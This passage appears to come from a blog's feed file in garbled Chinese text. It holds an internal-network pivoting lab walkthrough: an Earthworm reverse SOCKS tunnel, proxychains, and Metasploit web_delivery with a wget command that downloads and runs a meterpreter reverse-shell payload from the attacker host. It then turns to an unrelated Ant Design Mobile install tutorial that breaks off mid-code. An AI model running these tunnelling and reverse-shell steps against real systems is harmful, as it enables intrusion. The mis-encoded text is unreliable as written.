æœåŠ¡å™¨ã€‚</li><li><code>-l 1080</code>ï¼šæŒ‡å®šæœ¬åœ°ç›‘å¬ç«¯å£ä¸º 1080ã€‚è¿™æ„å‘³ç€ Earthworm å°†åœ¨æœ¬åœ°è®¡ç®—æœºçš„ 1080 ç«¯å£ä¸Šç›‘å¬è¿›æ¥çš„ SOCKS ä»£ç†è¯·æ±‚ã€‚</li><li><code>-e 1234</code>ï¼šæŒ‡å®šè¿œç¨‹ SOCKS æœåŠ¡å™¨çš„ç«¯å£ä¸º 1234ã€‚è¿™æ„å‘³ç€æ‰€æœ‰é€šè¿‡æœ¬åœ° SOCKS æœåŠ¡å™¨ï¼ˆç›‘å¬åœ¨ 1080 ç«¯å£ï¼‰çš„æµé‡éƒ½å°†è¢«è½¬å‘åˆ°è¿œç¨‹ SOCKS æœåŠ¡å™¨çš„ 1234 ç«¯å£ã€‚</li></ul></blockquote><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2014.36.57.png" alt="æˆªå±2025-01-15 14.36.57" style="zoom:40%;"><ul><li>DMZå—æ§ä¸»æœºï¼š</li></ul><blockquote><p>ä¸Šä¼ ew_for_linux64</p></blockquote><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2014.40.28.png" style="zoom:50%;"><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2014.41.47.png" style="zoom:50%;"><p>ç”±äºå·²ç»è·å¾—äº†ssh rootæƒé™ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ç›´æ¥ç”¨scpå¤åˆ¶æ–‡ä»¶åˆ°ç›®æ ‡ç³»ç»Ÿä¸­ã€‚</p><blockquote><p>å¹¶æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./ew_for_linux64 <span class="token parameter variable">-s</span> rssocks <span class="token parameter variable">-d</span> <span class="token number">192.168</span>.43.26 <span class="token parameter variable">-e</span> <span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>å‘½ä»¤è¯¦è§£ï¼š</p><ul><li><code>-s rssocks</code>ï¼šæŒ‡å®šä½¿ç”¨ <code>rssocks</code> æ¨¡å¼ã€‚<code>rssocks</code> æ¨¡å¼ç”¨äºåˆ›å»ºä¸€ä¸ª SOCKS æœåŠ¡ç«¯ï¼Œå®ƒå°†æ¥æ”¶æ¥è‡ªè¿œç¨‹ SOCKS å®¢æˆ·ç«¯çš„è¿æ¥ï¼Œå¹¶å°†è¿™äº›è¿æ¥è½¬å‘åˆ°æœ¬åœ°çš„ç‰¹å®šç«¯å£ã€‚</li><li><code>-d 192.168.1.7</code>ï¼šæŒ‡å®šç›®æ ‡ä¸»æœºçš„ IP åœ°å€ä¸º <code>192.168.1.7</code>ã€‚è¿™æ„å‘³ç€ Earthworm å°†å°è¯•è¿æ¥åˆ°è¿™ä¸ª IP åœ°å€ä¸Šçš„ SOCKS å®¢æˆ·ç«¯ã€‚</li><li><code>-e 1234</code>ï¼šæŒ‡å®šæœ¬åœ°è½¬å‘ç«¯å£ä¸º 1234ã€‚è¿™æ„å‘³ç€æ‰€æœ‰é€šè¿‡è¿œç¨‹ SOCKS å®¢æˆ·ç«¯çš„æµé‡éƒ½å°†è¢«è½¬å‘åˆ°æœ¬åœ°çš„ 1234 ç«¯å£ã€‚</li></ul></blockquote><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2014.42.40.png" style="zoom:50%;"><ul><li>è®¾ç½®proxychains</li></ul><blockquote><h4 id="ä»€ä¹ˆæ˜¯proxychains"><a href="#ä»€ä¹ˆæ˜¯proxychains" class="headerlink" title="ä»€ä¹ˆæ˜¯proxychains"></a>ä»€ä¹ˆæ˜¯proxychains</h4><p>Proxychains æ˜¯ä¸€ä¸ªéå¸¸æœ‰ç”¨çš„å·¥å…·ï¼Œå®ƒå…è®¸ä½ é€šè¿‡ä¸€ä¸ªæˆ–å¤šä¸ªä»£ç†æœåŠ¡å™¨æ¥è¿è¡Œä½ çš„åº”ç”¨ç¨‹åºã€‚å®ƒé€šè¿‡åŠ«æŒåº”ç”¨ç¨‹åºçš„ç½‘ç»œè¯·æ±‚ï¼Œå¹¶å°†è¿™äº›è¯·æ±‚é€šè¿‡é…ç½®çš„ä»£ç†é“¾å‘é€å‡ºå»ï¼Œä»è€Œå®ç°ç½‘ç»œæµé‡çš„ä»£ç†ã€‚</p><p>ProxyChainsæ˜¯Linuxå’Œå…¶ä»–Unicesä¸‹çš„ä»£ç†å·¥å…·ã€‚å®ƒå¯ä»¥ä½¿ä»»ä½•ç¨‹åºé€šè¿‡ä»£ç†ä¸Šç½‘ï¼Œå…è®¸TCPå’ŒDNSé€šè¿‡ä»£ç†éš§é“ï¼Œæ”¯æŒHTTPã€SOCKS4å’ŒSOCKS5ç±»å‹çš„ä»£ç†æœåŠ¡å™¨ï¼Œå¹¶ä¸”å¯é…ç½®å¤šä¸ªä»£ç†ã€‚</p><p>è®¾ç½®ProxyChainsçš„å…·ä½“æ“ä½œæ­¥éª¤å¦‚ä¸‹æ‰€ç¤ºï¼š</p><ul><li>æ‰“å¼€ProxyChainsé…ç½®æ–‡ä»¶ï¼š</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">vim</span> /etc/proxychains4.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>æ·»åŠ ä»£ç†æœåŠ¡å™¨</li></ul><p>åœ¨é…ç½®æ–‡ä»¶ä¸­ï¼Œæ‰¾åˆ° <code>[ProxyList]</code> éƒ¨åˆ†ï¼Œå¹¶æ·»åŠ ä½ çš„ä»£ç†æœåŠ¡å™¨ä¿¡æ¯ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›ç¤ºä¾‹é…ç½®ï¼š</p><p><strong>SOCKS5 ä»£ç†</strong>ï¼š</p><pre class="line-numbers language-none"><code class="language-none">socks5 192.168.1.100 1080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>HTTP ä»£ç†</strong>ï¼š</p><pre class="line-numbers language-none"><code class="language-none">http 192.168.1.101 8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>SOCKS4 ä»£ç†</strong>ï¼š</p><pre class="line-numbers language-none"><code class="language-none">socks4 192.168.1.102 9050<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½ å¯ä»¥æ·»åŠ å¤šä¸ªä»£ç†ï¼ŒProxychains ä¼šæ ¹æ®é…ç½®çš„è§„åˆ™ä½¿ç”¨è¿™äº›ä»£ç†ã€‚</p><ul><li>é…ç½®ä»£ç†é“¾æ¨¡å¼</li></ul><p>åœ¨é…ç½®æ–‡ä»¶çš„é¡¶éƒ¨ï¼Œä½ å¯ä»¥é€‰æ‹©ä¸åŒçš„ä»£ç†é“¾æ¨¡å¼ï¼š</p><p>åŠ¨æ€é“¾ (<code>dynamic_chain</code>)**ï¼šProxychains å°†æŒ‰é¡ºåºå°è¯•æ¯ä¸ªä»£ç†ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªå·¥ä½œçš„ä»£ç†ã€‚</p><p>**ä¸¥æ ¼é“¾ (<code>strict_chain</code>)**ï¼šProxychains å°†æŒ‰é¡ºåºå°è¯•æ¯ä¸ªä»£ç†ï¼Œå¦‚æœä¸€ä¸ªä»£ç†å¤±è´¥ï¼Œå®ƒå°†åœæ­¢å°è¯•ã€‚</p><p>ä¾‹å¦‚ï¼Œè¦å¯ç”¨åŠ¨æ€é“¾æ¨¡å¼ï¼Œä½ å¯ä»¥åœ¨é…ç½®æ–‡ä»¶çš„é¡¶éƒ¨æ·»åŠ æˆ–ç¡®ä¿ä»¥ä¸‹è¡Œæœªè¢«æ³¨é‡Šï¼ˆå³æ²¡æœ‰ <code>#</code> åœ¨è¡Œé¦–ï¼‰ï¼š</p><pre class="line-numbers language-none"><code class="language-none">dynamic_chain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>ä¿å­˜å¹¶é€€å‡ºç¼–è¾‘å™¨</li></ul><p>ä¿å­˜æ›´æ”¹å¹¶é€€å‡ºç¼–è¾‘å™¨ã€‚å¦‚æœä½ ä½¿ç”¨çš„æ˜¯ <code>nano</code>ï¼Œå¯ä»¥æŒ‰ <code>Ctrl + X</code>ï¼Œç„¶åæŒ‰ <code>Y</code> ç¡®è®¤ä¿å­˜æ›´æ”¹ï¼Œæœ€åæŒ‰ <code>Enter</code> ä¿å­˜æ–‡ä»¶ã€‚</p><ul><li>ä½¿ç”¨ Proxychains</li></ul><p>ç°åœ¨ï¼Œä½ å¯ä»¥é€šè¿‡åœ¨å‘½ä»¤å‰åŠ ä¸Š <code>proxychains</code> æ¥ä½¿ç”¨ Proxychainsã€‚ä¾‹å¦‚ï¼Œä½¿ç”¨ <code>proxychains</code> è¿è¡Œ <code>curl</code> å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains <span class="token function">curl</span> http://example.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™å°†é€šè¿‡ä½ é…ç½®çš„ä»£ç†æœåŠ¡å™¨å‘é€è¯·æ±‚ã€‚</p></blockquote><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2014.55.07.png" alt="åŸé…ç½®" style="zoom:40%;"><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2014.55.57.png" alt="åŸé…ç½®" style="zoom:50%;"><p>ä¿®æ”¹åçš„é…ç½®ï¼š</p><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2014.56.34.png" style="zoom:50%;"><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2014.57.10.png" style="zoom:40%;"><p>ä¹‹åä¾¿å¯ä»¥ä½¿ç”¨proxychainså°†æˆ‘ä»¬æ”»å‡»æœºä¸Šçš„ç¨‹åºä»£ç†è¿›ç¬¬äºŒå±‚ç½‘ç»œï¼ˆ192.168.52.1/24ï¼‰äº†ã€‚</p><p>æ¯”å¦‚ç”¨curlè®¿é—®å†…ç½‘ä¸»æœºçš„webæœåŠ¡ï¼š</p><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2015.13.23.png" style="zoom:50%;"><p>æˆåŠŸä»kaliè®¿é—®åˆ°äº†å†…ç½‘ä¸»æœºçš„webæœåŠ¡ã€‚</p><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2015.19.00.png" style="zoom:40%;"><p>æ­£å¸¸æƒ…å†µä¸‹pingå†…ç½‘ä¸»æœºæ˜¯æ— æ³•pingé€šçš„ï¼Œä½†æ˜¯proxychainsä¸æ”¯æŒicmpåè®®ï¼Œæ‰€ä»¥ä¹Ÿæ²¡æ³•ä½¿ç”¨è¯¸å¦‚proxychains4 ping 192.168.52.20çš„å‘½ä»¤æµ‹è¯•è¿é€šæ€§ã€‚</p><ul><li>msfé…ç½®è·¯ç”±</li></ul><p>ä½¿ç”¨ msf exploit/multi/script/web_deliveryæ¨¡å—åˆ›å»ºåå¼¹shellçš„payloadï¼ŒæŠ•é€’åˆ°DMZå—æ§ä¸»æœºä¸­ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use exploit/multi/script/web_delivery<span class="token builtin class-name">set</span> LPORT <span class="token number">5555</span><span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.43.26<span class="token builtin class-name">set</span> payload linux/x64/meterpreter/reverse_tcp<span class="token builtin class-name">set</span> SRVPORT <span class="token number">9090</span>exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token parameter variable">-qO</span> xDfaOgFL --no-check-certificate http://192.168.43.26:9090/plurgt4DqlP<span class="token punctuation">;</span> <span class="token function">chmod</span> +x xDfaOgFL<span class="token punctuation">;</span> ./xDfaOgFL<span class="token operator">&amp;</span> disown<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2015.54.38.png" alt="æˆªå±2025-01-15 15.54.38"></p><p> æ‰§è¡Œä¹‹åä¸Šçº¿meterpreterï¼š</p><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2015.55.00.png" style="zoom:40%;"><p>è®¾ç½®è·¯ç”±ï¼š</p><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2015.56.25.png" style="zoom:50%;"><p>é€šè¿‡æ·»åŠ è·¯ç”±å¯ä»¥å°†msfconsoleè·¯ç”±åˆ°å†…ç½‘ä¸­ã€‚</p><p>æˆ‘ä»¬å°è¯•ä½¿ç”¨metasploitçš„ auxiliary/scanner/discovery/udp_probe æ¨¡å—æ¥æ‰«æç¬¬äºŒå±‚ç½‘ç»œä¸­çš„ä¸»æœºå­˜æ´»ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use auxiliary/scanner/discovery/udp_probe<span class="token builtin class-name">set</span> rhosts <span class="token number">192.168</span>.52.1-255<span class="token builtin class-name">set</span> threads <span class="token number">5</span>run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2016.03.09.png" alt="æˆªå±2025-01-15 16.03.09" style="zoom:50%;"><p>â€‹       æˆåŠŸæ¢æµ‹åˆ°ä¸€å°è®¡ç®—æœºï¼š192.168.52.30.</p><p>ä½¿ç”¨proxychainsä»£ç†æ”»å‡»æœºçš„æµé‡ï¼Œå®ç°å¯¹äºŒå±‚ç½‘ç»œçš„æ¢æµ‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">proxychains4 nmap <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sT</span> <span class="token parameter variable">-F</span> <span class="token parameter variable">-O</span> <span class="token number">192.168</span>.52.30 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h4 id="å¤§æˆ˜Bug-ã€Œproxychains4-nmap-æŠ¥é”™ã€"><a href="#å¤§æˆ˜Bug-ã€Œproxychains4-nmap-æŠ¥é”™ã€" class="headerlink" title="å¤§æˆ˜Bug-ã€Œproxychains4 nmap  æŠ¥é”™ã€"></a>å¤§æˆ˜Bug-ã€Œproxychains4 nmap  æŠ¥é”™ã€</h4><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2016.08.46.png" alt="æˆªå±2025-01-15 16.08.46" style="zoom:50%;"><p>è§£å†³ï¼š</p><p>ç¼–è¾‘ /etc/proxychains4.conf</p><p>æ³¨é‡Šæ‰dnsè§£æä»£ç†</p><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2016.11.13.png" alt="æˆªå±2025-01-15 16.11.13" style="zoom:50%;"></blockquote><p>é‡æ–°æ‰§è¡Œæ‰«æ</p><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2016.16.08.png" style="zoom:50%;"><p>æ‰«æç»“æœï¼š</p><img src="/2025/01/15/nei-wang-gong-fang/earthworm-sui-dao-da-jian/%E6%88%AA%E5%B1%8F2025-01-15%2016.17.06.png" style="zoom:50%;"><p>è‡³æ­¤ï¼ŒæˆåŠŸå®ç°å€ŸåŠ©éš§é“ä½¿ç”¨kaliçš„æ”»å‡»å·¥å…·æ¢æµ‹äºŒå±‚ç½‘ç»œå†…ç³»ç»Ÿä¿¡æ¯ã€‚</p><p>æµé‡è·¯å¾„å¤§è‡´å¦‚ä¸‹ï¼š</p><p>kaliï¼ˆnmapï¼‰192.168.43.26â€”â€”&gt;127.0.0.1:8080â€”â€”&gt;192.168.43.253:1234â€”â€”&gt;192.168.52.10â€”â€”&gt;192.168.52.30</p>]]></content>
      
      
      <categories>
          
          <category> å†…ç½‘æ”»é˜² </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å†…ç½‘æ”»é˜² </tag>
            
            <tag> éš§é“æ­å»º </tag>
            
            <tag> Earthworm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>AntDesignMobileç»„ä»¶</title>
      <link href="/2025/01/09/qian-hou-duan-kai-fa/antdesignmobile-zu-jian/"/>
      <url>/2025/01/09/qian-hou-duan-kai-fa/antdesignmobile-zu-jian/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€ä»€ä¹ˆæ˜¯Ant-Design-Mobile"><a href="#ä¸€ã€ä»€ä¹ˆæ˜¯Ant-Design-Mobile" class="headerlink" title="ä¸€ã€ä»€ä¹ˆæ˜¯Ant Design Mobile"></a>ä¸€ã€ä»€ä¹ˆæ˜¯Ant Design Mobile</h1><p>Ant Design Mobileæ˜¯ç”±æ”¯ä»˜å®è®¾è®¡å›¢é˜ŸåŸºäºèš‚èšé›†å›¢çš„ä¼—å¤šä¸šåŠ¡å®è·µå’Œäº¿ä¸‡ç”¨æˆ·çš„éªŒè¯åé¦ˆï¼ŒæŠ½è±¡æ„å»ºå‡ºçš„ç§»åŠ¨ç«¯UIç»„ä»¶åº“ã€‚å®ƒæ˜¯Ant Designçš„ç§»åŠ¨ç«¯ç‰ˆæœ¬ï¼Œä¸“æ³¨äºä¸ºç§»åŠ¨ç«¯åº”ç”¨å’Œç½‘é¡µè®¾è®¡æä¾›ä¸€å¥—ä¸°å¯Œä¸”æ˜“äºä½¿ç”¨çš„ç»„ä»¶ã€‚Ant Design MobileåŸºäºReactæŠ€æœ¯æ ˆå¼€å‘ï¼Œæ”¯æŒTypeScriptï¼Œå¹¶éµå¾ªAnt Designçš„è®¾è®¡è§„èŒƒã€‚</p><p>Ant Design Mobileé€‚ç”¨äºå„ç§ç±»å‹çš„ç§»åŠ¨åº”ç”¨å¼€å‘é¡¹ç›®ï¼Œæ— è®ºæ˜¯ä¼ä¸šçº§åº”ç”¨è¿˜æ˜¯ä¸ªäººé¡¹ç›®ï¼Œéƒ½å¯ä»¥é€šè¿‡å…¶ä¸°å¯Œçš„ç»„ä»¶åº“å¿«é€Ÿæ„å»ºå‡ºåŠŸèƒ½å®Œå¤‡ã€ç¾è§‚æ˜“ç”¨çš„ç§»åŠ¨ç«¯ç•Œé¢ã€‚å®ƒå¸®åŠ©å¼€å‘è€…å’Œè®¾è®¡å¸ˆå°†åˆ›æ„å¿«é€Ÿè½¬åŒ–ä¸ºå®é™…åº”ç”¨ï¼Œæå‡å¼€å‘æ•ˆç‡å’Œç”¨æˆ·ä½“éªŒã€‚</p><h1 id="äºŒã€ä¸»è¦ç‰¹ç‚¹"><a href="#äºŒã€ä¸»è¦ç‰¹ç‚¹" class="headerlink" title="äºŒã€ä¸»è¦ç‰¹ç‚¹"></a>äºŒã€ä¸»è¦ç‰¹ç‚¹</h1><ul><li><strong>é«˜æ€§èƒ½</strong>ï¼šæ— éœ€å¤æ‚é…ç½®ï¼Œå³å¯æ‹¥æœ‰æœ€ä½³çš„åŒ…ä½“ç§¯å¤§å°å’Œæœ€ä¼˜çš„æ€§èƒ½ã€‚</li><li><strong>å¯å®šåˆ¶</strong>ï¼šåŸºäºCSSå˜é‡ï¼Œå¯ä»¥çµæ´»åœ°è°ƒæ•´ç»„ä»¶å¤–è§‚æˆ–è‡ªç”±åˆ›é€ è‡ªå·±çš„ä¸»é¢˜ã€‚</li><li><strong>åŸå­åŒ–</strong>ï¼šæ¯ä¸ªç»„ä»¶æä¾›çš„åŠŸèƒ½æ°åˆ°å¥½å¤„åœ°æ»¡è¶³ä¸šåŠ¡æ‰€éœ€ã€‚</li><li><strong>æµç•…</strong>ï¼šæ‹¥æœ‰æµç•…çš„æ‰‹åŠ¿äº¤äº’å’Œç»†è‡´çš„åŠ¨ç”»å±•ç¤ºï¼ŒåŠ©åŠ›æ‰“é€ æè‡´çš„ç”¨æˆ·ä½“éªŒã€‚</li><li><strong>ç¾è§‚æ˜“ç”¨</strong>ï¼šéµå¾ªç²¾å¿ƒè®¾è®¡çš„è§†è§‰è§„èŒƒï¼Œæ‹¥æœ‰ç®€æ´ç¾è§‚çš„å¤–è§‚å’Œæ˜“äºä½¿ç”¨çš„äº¤äº’ä½“éªŒï¼Œé€‚ç”¨äºiOSå’ŒAndroidç”¨æˆ·ã€‚</li><li><strong>å¿«é€Ÿå¼€å‘</strong>ï¼šæä¾›äº†å¤§é‡ç°æˆçš„UIç»„ä»¶å’Œæ¨¡æ¿ï¼Œä½¿å¾—å¼€å‘è¿‡ç¨‹æ›´åŠ é«˜æ•ˆã€‚</li></ul><h1 id="ä¸‰ã€antd-mobileå’Œantdæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"><a href="#ä¸‰ã€antd-mobileå’Œantdæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ" class="headerlink" title="ä¸‰ã€antd-mobileå’Œantdæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ"></a>ä¸‰ã€antd-mobileå’Œantdæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</h1><p>Ant Designï¼ˆç®€ç§°antdï¼‰å’ŒAnt Design Mobileï¼ˆç®€ç§°antd-mobileï¼‰éƒ½æ˜¯ç”±èš‚èšé‡‘æœè®¾è®¡å›¢é˜Ÿå¼€å‘çš„UIç»„ä»¶åº“ï¼Œä½†å®ƒä»¬åœ¨è®¾è®¡ç›®æ ‡å’Œåº”ç”¨åœºæ™¯ä¸Šæœ‰æ‰€ä¸åŒï¼š</p><h2 id="3-1-è®¾è®¡ç›®æ ‡å’Œåº”ç”¨åœºæ™¯"><a href="#3-1-è®¾è®¡ç›®æ ‡å’Œåº”ç”¨åœºæ™¯" class="headerlink" title="3.1 è®¾è®¡ç›®æ ‡å’Œåº”ç”¨åœºæ™¯"></a>3.1 è®¾è®¡ç›®æ ‡å’Œåº”ç”¨åœºæ™¯</h2><ul><li><strong>Ant Designï¼ˆantdï¼‰</strong>ï¼š<ul><li>ä¸»è¦é’ˆå¯¹<strong>PCç«¯</strong>å’Œ<strong>å¹³æ¿æµè§ˆå™¨</strong>è®¾è®¡ã€‚</li><li>æä¾›äº†ä¸°å¯Œçš„æ¡Œé¢ç«¯UIç»„ä»¶ï¼Œé€‚ç”¨äºæ„å»ºä¼ä¸šçº§çš„Webåº”ç”¨ã€‚</li></ul></li><li><strong>Ant Design Mobileï¼ˆantd-mobileï¼‰</strong>ï¼š<ul><li>ä¸“æ³¨äº<strong>ç§»åŠ¨ç«¯æµè§ˆå™¨</strong>ã€‚</li><li>æä¾›äº†é€‚åˆç§»åŠ¨ç«¯ä½¿ç”¨çš„è½»é‡çº§UIç»„ä»¶ï¼Œé€‚ç”¨äºæ„å»ºç§»åŠ¨ç«¯Webåº”ç”¨ã€‚</li></ul></li></ul><h2 id="3-2ç»„ä»¶å·®å¼‚"><a href="#3-2ç»„ä»¶å·®å¼‚" class="headerlink" title="3.2ç»„ä»¶å·®å¼‚"></a>3.2ç»„ä»¶å·®å¼‚</h2><ul><li><strong>ç»„ä»¶ç±»å‹å’Œäº¤äº’æ–¹å¼</strong>ï¼š<ul><li><strong>antd</strong>çš„ç»„ä»¶æ›´ç¬¦åˆæ¡Œé¢ç«¯ç”¨æˆ·çš„äº¤äº’ä¹ æƒ¯ï¼Œä¾‹å¦‚ä½¿ç”¨é¼ æ ‡ç‚¹å‡»ã€æ‹–æ‹½ç­‰æ“ä½œã€‚</li><li><strong>antd-mobile</strong>çš„ç»„ä»¶åˆ™æ›´æ³¨é‡ç§»åŠ¨ç«¯ç”¨æˆ·çš„äº¤äº’ä½“éªŒï¼Œå¦‚æ‰‹æŒ‡æ»‘åŠ¨ã€è§¦æ‘¸ç­‰æ“ä½œã€‚</li></ul></li><li><strong>ç»„ä»¶çš„å¤–è§‚å’Œå¸ƒå±€</strong>ï¼š<ul><li><strong>antd</strong>çš„ç»„ä»¶é€šå¸¸å…·æœ‰è¾ƒå¤§çš„å°ºå¯¸å’Œé—´è·ï¼Œä»¥é€‚åº”æ¡Œé¢å±å¹•çš„æ˜¾ç¤ºã€‚</li><li><strong>antd-mobile</strong>çš„ç»„ä»¶åˆ™è®¾è®¡å¾—æ›´åŠ ç´§å‡‘ï¼Œä»¥é€‚åº”ç§»åŠ¨è®¾å¤‡çš„å±å¹•å°ºå¯¸ã€‚</li></ul></li></ul><h1 id="å››ã€å®‰è£…"><a href="#å››ã€å®‰è£…" class="headerlink" title="å››ã€å®‰è£…"></a>å››ã€å®‰è£…</h1><h2 id="4-1-å®‰è£…"><a href="#4-1-å®‰è£…" class="headerlink" title="4.1 å®‰è£…"></a>4.1 å®‰è£…</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> antd-mobile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><h4 id="å¤§æˆ˜bug-ã€Œæœ‰äº›ç‰ˆæœ¬çš„ä¾èµ–åº“æ‰¾ä¸åˆ°ã€"><a href="#å¤§æˆ˜bug-ã€Œæœ‰äº›ç‰ˆæœ¬çš„ä¾èµ–åº“æ‰¾ä¸åˆ°ã€" class="headerlink" title="å¤§æˆ˜bug-ã€Œæœ‰äº›ç‰ˆæœ¬çš„ä¾èµ–åº“æ‰¾ä¸åˆ°ã€"></a>å¤§æˆ˜bug-ã€Œæœ‰äº›ç‰ˆæœ¬çš„ä¾èµ–åº“æ‰¾ä¸åˆ°ã€</h4><p>ä¸‹è½½è¾ƒä½ç‰ˆæœ¬çš„ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> view antd-mobile versions<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿è¡Œä¸Šé¢çš„å‘½ä»¤å¯ä»¥æŸ¥çœ‹å½“å‰æºæ‰€æ”¯æŒçš„ç‰ˆæœ¬ã€‚</p><p>è¿™é‡Œæˆ‘é€‰æ‹©äº†5.0.0çš„ç‰ˆæœ¬ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> antd-mobile@5.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å®‰è£…æˆåŠŸã€‚</p></blockquote><p>å®˜ç½‘æç¤ºï¼šå¯¹äº Reactï¼Œæˆ‘ä»¬å…¼å®¹çš„ç‰ˆæœ¬æ˜¯ <code>^16.8.0</code> <code>^17.0.0</code> <code>^18.0.0</code>ã€‚</p><p>æ‰€ä»¥è¦å®‰è£…åˆ¶å®šçš„reactç‰ˆæœ¬æ¥é€‚é…ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> i react-dom@18.0.0<span class="token function">npm</span> i react@18.0.0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="äº”ã€ä½¿ç”¨"><a href="#äº”ã€ä½¿ç”¨" class="headerlink" title="äº”ã€ä½¿ç”¨"></a>äº”ã€ä½¿ç”¨</h1><p>ä¸»è¦å‚è€ƒå®˜ç½‘ã€‚</p><h2 id="5-1-è¡¨æ ¼æ¸²æŸ“ï¼ˆä½¿ç”¨antdï¼Œantd-mobileæ²¡æœ‰è¡¨æ ¼ç»„ä»¶ï¼‰"><a href="#5-1-è¡¨æ ¼æ¸²æŸ“ï¼ˆä½¿ç”¨antdï¼Œantd-mobileæ²¡æœ‰è¡¨æ ¼ç»„ä»¶ï¼‰" class="headerlink" title="5.1 è¡¨æ ¼æ¸²æŸ“ï¼ˆä½¿ç”¨antdï¼Œantd-mobileæ²¡æœ‰è¡¨æ ¼ç»„ä»¶ï¼‰"></a>5.1 è¡¨æ ¼æ¸²æŸ“ï¼ˆä½¿ç”¨antdï¼Œantd-mobileæ²¡æœ‰è¡¨æ ¼ç»„ä»¶ï¼‰</h2><h3 id="5-1-1-å¼•å…¥Ant-Designè¡¨æ ¼ç»„ä»¶"><a href="#5-1-1-å¼•å…¥Ant-Designè¡¨æ ¼ç»„ä»¶" class="headerlink" title="5.1.1 å¼•å…¥Ant Designè¡¨æ ¼ç»„ä»¶"></a>5.1.1 å¼•å…¥Ant Designè¡¨æ ¼ç»„ä»¶</h3><p>é¦–å…ˆï¼Œç¡®ä¿ä½ å·²ç»å®‰è£…äº†Ant Design Mobileï¼Œå¹¶åœ¨ä½ çš„Reactç»„ä»¶ä¸­å¼•å…¥äº†è¡¨æ ¼ç»„ä»¶ã€‚ä¾‹å¦‚ï¼š</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> <span class="token 